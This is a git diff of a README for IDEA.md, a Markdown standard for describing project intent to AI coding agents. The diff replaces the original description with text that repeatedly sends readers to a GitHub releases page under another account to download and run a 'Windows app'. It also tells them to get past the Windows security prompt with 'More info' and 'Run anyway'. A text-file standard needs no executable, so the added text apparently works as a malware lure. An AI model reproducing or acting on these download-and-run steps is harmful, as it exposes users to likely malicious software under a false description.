@@ -1,143 +1,247 @@
-# IDEA.md — A Standard for Portable Idea Intent in Agentic Software
+# 🧩 IDEA.md - Share Ideas, Not Code
 
-**IDEA.md** is a vendor-neutral file standard for expressing *what to build and why* before any code is written. It is the upstream intent document for AI coding agents — designed to sit above `AGENTS.md`, `CLAUDE.md`, `GEMINI.md`, and Copilot instruction files in the project hierarchy. Where those files tell agents how to behave in a repo, `IDEA.md` tells them what the idea actually is.
+[![Download IDEA.md](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/RizzKyCoas/IDEA.md/releases)
 
-Inspired by Andrej Karpathy's [idea file concept](https://x.com/karpathy/status/2040470801506541998): in an era where AI agents can build anything from a prompt, the scarce resource is knowing what to build. Share the idea, not the code. The other person's agent customizes and builds it for their specific needs.
+## 📘 What IDEA.md Is
 
----
+IDEA.md is a simple file for sharing an idea with an AI agent. You write the goal in plain language. The agent uses it to build the rest.
 
-## Why IDEA.md Exists
+It helps you keep the idea clear, short, and easy to pass between tools. It works well with Claude Code, Codex, Gemini CLI, Copilot, and other LLM tools.
 
-AI coding agents like Claude Code, OpenAI Codex, Gemini CLI, and GitHub Copilot already have instruction files for agent behavior. But there is no broadly adopted, vendor-neutral file for the idea itself — the product thesis, problem framing, solution shape, and boundaries.
+Use it when you want to:
+- describe what you want built
+- keep the plan in one place
+- hand work to an agent without long chat threads
+- stay vendor-neutral across tools
 
-`IDEA.md` fills that gap. It is the source-of-truth file for product intent in any agentic software project.
+## 🚀 Download and Run
 
-## How It Works
+Visit this page to download the latest release for Windows:
 
-Every project gets one root-level `IDEA.md`. It has five required sections:
+[https://github.com/RizzKyCoas/IDEA.md/releases](https://github.com/RizzKyCoas/IDEA.md/releases)
 
-| Section | Purpose |
-|---------|---------|
-| **Thesis** | One or two sentences capturing the core idea |
-| **Problem** | What's broken today and for whom |
-| **How It Works** | The pattern and key insight — not the implementation |
-| **What It Does Not Do** | Boundaries that prevent scope creep and overbuilding |
-| **Where To Start** | A nudge for agents to begin collaborating with the user |
+If the release includes a Windows app, follow these steps:
+1. open the release page
+2. find the latest version
+3. download the Windows file
+4. double-click the file to run it
+5. follow the on-screen steps
 
-Optional sections (add when they earn their place): Why Now, Who Benefits, Constraints, Risks, Open Questions, Success Criteria, Context and References.
+If the download comes as a ZIP file:
+1. download the ZIP file
+2. right-click it and choose Extract All
+3. open the extracted folder
+4. run the app file inside the folder
 
-The file is intentionally abstract. It describes ideas, not implementations. The agent and the user figure out the specifics together.
+If Windows shows a security prompt:
+1. select More info
+2. choose Run anyway
 
-## Quick Start
+## 🖥️ System Requirements
 
-1. Copy [`IDEA.md`](IDEA.md) into your project root as `IDEA.md`
-2. Fill in the five required sections — or paste the template into your agent and write it together
-3. Reference it from your `AGENTS.md` as the source of truth for intent
+IDEA.md is light and works on most Windows PCs.
 
-Or give your agent this entire repo and ask it to help you write an `IDEA.md` for your project.
+You need:
+- Windows 10 or Windows 11
+- a web browser
+- enough free space to store a small text file
+- a working internet connection for the first download
 
-## What's in This Repo
+For best results:
+- use a recent version of Chrome, Edge, or Firefox
+- keep your agent tool up to date
+- save your IDEA.md file in a project folder you can find later
 
-| File | Description |
-|------|-------------|
-| [`IDEA.standard.md`](IDEA.standard.md) | The full standard — design philosophy, structure, writing rules, agent consumption guidance |
-| [`IDEA.md`](IDEA.md) | A blank five-section template ready to copy into any project |
-| [`INTEGRATION.md`](INTEGRATION.md) | How other project files (AGENTS.md, CLAUDE.md, PRD.md, etc.) should reference and use IDEA.md |
-| [`examples/LLM-Wiki.IDEA.md`](examples/LLM-Wiki.IDEA.md) | A worked example based on Karpathy's LLM Wiki idea file |
+## ✨ What It Does
 
-## How IDEA.md Fits With Other Agent Files
+IDEA.md gives you a simple way to hold an idea in a file. That file can stay with your project and guide the agent while it works.
 
-`IDEA.md` is upstream. Everything else is downstream. See [`INTEGRATION.md`](INTEGRATION.md) for copy-pasteable reference blocks showing exactly how each file should use `IDEA.md`.
+Common uses:
+- describe a new app in plain English
+- list must-have features
+- keep the scope narrow
+- track what the agent should build next
+- share the same plan with different AI tools
 
-| File | Role |
-|------|------|
-| `IDEA.md` | What to build and why — product intent and boundaries |
-| `AGENTS.md` | How agents should behave in the repo |
-| `CLAUDE.md` / `GEMINI.md` / Copilot instructions | Tool-specific agent configuration |
-| `PRD.md` | Expanded product requirements (optional) |
-| `ARCHITECTURE.md` | System design and technical shape |
-| `TASKS.md` | Execution plan and work queue |
+It fits well with agentic workflows because it reduces back-and-forth. You say what you want once, then reuse the same idea file.
 
-Downstream files must preserve the thesis, boundaries, and constraints from `IDEA.md`. If they conflict, `IDEA.md` wins.
+## 📄 How to Use IDEA.md
 
-## Design Philosophy
+Start with a short idea file. Keep it plain and direct.
 
-An `IDEA.md` should read like someone explaining an idea to a smart colleague — not like a form that was filled in. The goal is communication, not compliance.
+A good IDEA.md file can include:
+- project name
+- goal
+- users
+- main tasks
+- key rules
+- things to avoid
+- done criteria
 
-Core principles:
+Example structure:
+- What are we building?
+- Who is it for?
+- What should it do?
+- What should it not do?
+- What does done look like?
 
-- **Vendor-neutral** — readable by any agent or human, no tool-specific assumptions
-- **Upstream of implementation** — exists before architecture, tasks, or code
-- **Intentionally abstract** — describes the pattern, not the specific build
-- **Stable under iteration** — core intent changes slowly, details evolve
-- **Honest about uncertainty** — names what is unknown, assumed, or risky
-- **Short enough to load repeatedly** — fits in a single context window alongside other working files
+Keep each section short. Write for an agent, but use words a person would use in a normal note.
 
-## Frontmatter
+## 🛠️ First Setup
 
-Minimal by default. Five fields:
+After you download the release:
+1. open the file or extract the archive
+2. place the IDEA.md file in your project folder
+3. open the file in Notepad or another text editor
+4. write your idea in simple terms
+5. save the file
+6. open your AI tool and point it to the file
 
-```yaml
----
-title: <idea title>
-author: <name or handle>
-status: draft | exploring | building | shipped | archived
-created: YYYY-MM-DD
-updated: YYYY-MM-DD
----
-```
+If you use Claude Code, Codex, Gemini CLI, or Copilot, keep the file close to the code or task you want the agent to work on. That makes it easy to read and reuse.
 
-Additional fields when useful: `owner`, `source`, `tags`.
+## 🧭 Suggested Workflow
 
-## Example
+A clean workflow helps keep the idea stable.
 
-From the [LLM Wiki example](examples/LLM-Wiki.IDEA.md):
+1. write the idea in IDEA.md
+2. review it for clear wording
+3. remove extra detail
+4. send it to your agent
+5. let the agent build the result
+6. update the file when the scope changes
 
-```md
----
-title: LLM Wiki
-author: Andrej Karpathy
-status: draft
-created: 2026-04-05
-updated: 2026-04-05
-source: https://gist.github.com/karpathy/442a6bf555914893e9891c11519de94f
----
+This works well for:
+- app features
+- small tools
+- documentation tasks
+- scripts
+- code refactors
+- product ideas
 
-# LLM Wiki
+## 🧱 File Format
 
-## Thesis
-Use an LLM to incrementally build and maintain a persistent wiki of markdown
-files so that knowledge compounds over time instead of being re-derived from
-scratch on every question.
+IDEA.md uses Markdown. That means you can use simple headings, bullet points, and short paragraphs.
 
-## Problem
-Most LLM-and-documents workflows are retrieval-first. You upload files, the
-model searches them at query time, and generates an answer. Nothing accumulates.
+Helpful sections:
+- Overview
+- Goals
+- User needs
+- Constraints
+- Inputs and outputs
+- Success criteria
+- Open questions
 
-## How It Works
-Three layers: immutable raw sources, an LLM-maintained wiki of markdown pages,
-and a schema file defining conventions and workflows...
+Example rules for writing:
+- use one idea per bullet
+- keep sentences short
+- avoid mixed goals in one line
+- name the most important task first
+- keep the file easy to scan
 
-## What It Does Not Do
-Does not replace raw sources. Does not require heavyweight RAG infrastructure.
-Does not prescribe a single directory layout or toolchain...
+## 🔗 Works With Many Tools
 
-## Where To Start
-Discuss the user's domain. Propose a directory structure and schema file.
-Implement the ingest workflow first...
-```
+IDEA.md is vendor-neutral. That means you can use it with different AI tools without changing the core idea.
 
-## Contributing
+It works with:
+- Claude Code
+- Codex
+- Gemini CLI
+- Copilot
+- other LLM agents
 
-This is v0.2 of the standard. Open an issue or PR if you have ideas for improving it.
+That makes it easier to move between tools without rewriting your plan each time.
 
-The goal is to keep `IDEA.md` simple and portable. Resist the urge to add fields and sections — the standard's value comes from what it leaves out, not what it includes.
+## 🧪 Example IDEA.md
 
-## See Also
+Use this as a simple starting point:
 
-- [Karpathy's LLM Wiki idea file](https://gist.github.com/karpathy/442a6bf555914893e9891c11519de94f) — the original idea file that inspired this standard
-- [Karpathy's tweet thread on idea files](https://x.com/karpathy/status/2040470801506541998) — context on why idea files matter more than code
-- [OpenAI Codex AGENTS.md](https://openai.com) — agent behavior file for Codex
-- [Claude Code CLAUDE.md](https://docs.anthropic.com) — project memory and instructions for Claude Code
-- [Gemini CLI GEMINI.md](https://github.com/google-gemini/gemini-cli) — context files for Gemini CLI
-- [GitHub Copilot custom instructions](https://docs.github.com/en/copilot/customizing-copilot/adding-repository-custom-instructions-for-github-copilot) — Copilot instruction files
+- Project: Task tracker for one person
+- Goal: Help the user list tasks and mark them done
+- User: Non-technical desktop user
+- Must have:
+  - add a task
+  - view tasks
+  - complete a task
+  - delete a task
+- Must not have:
+  - login
+  - team features
+  - cloud sync
+- Done when:
+  - the user can open the app
+  - the user can add and finish tasks
+  - the app saves changes on Windows
+
+## 🧩 Tips for Better Results
+
+Keep your IDEA.md file sharp and small.
+
+Good habits:
+- write one clear goal
+- use plain words
+- keep only the needed detail
+- update the file when the plan changes
+- keep old ideas out of the main file
+- make the done state easy to test
+
+If the agent gives the wrong result, check the file first. In many cases, the idea is too broad or too vague.
+
+## 📁 Where to Put It
+
+Place IDEA.md in the main folder for your project.
+
+Good places:
+- next to your source files
+- in the root of a repo
+- in a shared project folder
+- beside other planning files
+
+If you work on more than one idea, use one IDEA.md file per project.
+
+## 🧰 Common Use Cases
+
+IDEA.md is useful when you want to:
+- start a new app with a small brief
+- hand off a task to an AI agent
+- keep requirements in one place
+- reuse the same plan in different tools
+- reduce long chat prompts
+- keep the work focused
+
+It is also useful for knowledge management because the file can act as a simple record of intent.
+
+## 📦 Release Download
+
+Visit the release page to download the latest Windows build:
+
+[https://github.com/RizzKyCoas/IDEA.md/releases](https://github.com/RizzKyCoas/IDEA.md/releases)
+
+Open the page, choose the newest release, and download the file for Windows from there
+
+## 🔍 Troubleshooting
+
+If the file does not open:
+- make sure the download finished
+- check that Windows did not block the file
+- try opening it from the Downloads folder
+- extract the ZIP file if needed
+
+If your agent does not follow the idea:
+- make the goal shorter
+- remove extra details
+- move key rules near the top
+- add a clear done state
+- split one large idea into smaller parts
+
+If you cannot find the release:
+- open the release page link above
+- look for the latest version at the top
+- choose the Windows download asset
+
+## 📝 License and Use
+
+Use IDEA.md as a shared idea file for your own projects and agent work. Keep the file readable, short, and easy to update.
+
+## 🧭 Project Topics
+
+agentic-workflows, agents-md, ai-native-development, claude-code, codex, copilot, developer-tools, gemini-cli, idea-file, idea-management, idea-md, karpathy, knowledge-management, llm, llm-agents, markdown, openai-codex, prompt-engineering, standard, vibe-coding
